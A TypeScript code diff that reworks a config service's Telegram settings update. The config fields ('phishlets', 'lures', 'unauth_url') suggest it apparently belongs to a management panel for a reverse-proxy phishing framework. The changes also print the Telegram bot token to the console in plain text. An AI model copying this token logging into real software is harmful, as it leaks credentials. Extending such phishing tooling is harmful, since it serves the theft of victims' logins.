@@ -336,37 +336,67 @@ export class ConfigService {
   }
 
   public async updateTelegramSettings(
-    telegramSettings: TelegramSettings
+    bot_token: string,
+    chat_id: string
   ): Promise<boolean> {
     try {
+      console.log("Updating Telegram settings:", { bot_token, chat_id });
+
       // Get the current config
       const config = await this.readConfig();
 
-      // If we have an existing config, update only the telegram settings
       if (config) {
-        // Preserve existing telegram settings and merge with new ones
-        config.telegram = {
-          ...config.telegram,
-          ...telegramSettings,
-        };
+        // Ensure general section exists
+        if (!config.general) {
+          config.general = {
+            telegram_bot_token: "",
+            telegram_chat_id: "",
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: "",
+          };
+        }
 
-        await this.writeConfig(config);
-        return true;
+        // Update telegram settings in the general section
+        config.general.telegram_bot_token = bot_token;
+        config.general.telegram_chat_id = chat_id;
+
+        // Log before writing
+        console.log("Writing updated config with telegram settings:", {
+          token: config.general.telegram_bot_token,
+          chatId: config.general.telegram_chat_id,
+        });
+
+        // Write config back to file
+        const result = await this.writeConfig(config);
+        console.log("Telegram settings update result:", result);
+        return result;
       } else {
-        // No existing config found, create a new one (this should rarely happen)
+        // No existing config found, create a new one
         const newConfig: Config = {
-          telegram: telegramSettings,
-          redirectUrl: "",
-          blacklist: {
-            domains: [],
-            ips: [],
-            strings: [],
-            activated: false,
+          blacklist: { mode: "unauth" },
+          general: {
+            telegram_bot_token: bot_token,
+            telegram_chat_id: chat_id,
+            autocert: true,
+            dns_port: 53,
+            https_port: 443,
+            bind_ipv4: "",
+            external_ipv4: "",
+            domain: "",
+            unauth_url: "",
           },
+          phishlets: {},
+          lures: [],
         };
 
-        await this.writeConfig(newConfig);
-        return true;
+        const result = await this.writeConfig(newConfig);
+        console.log("Created new config with telegram settings:", result);
+        return result;
       }
     } catch (error) {
       console.error("Error updating Telegram settings:", error);
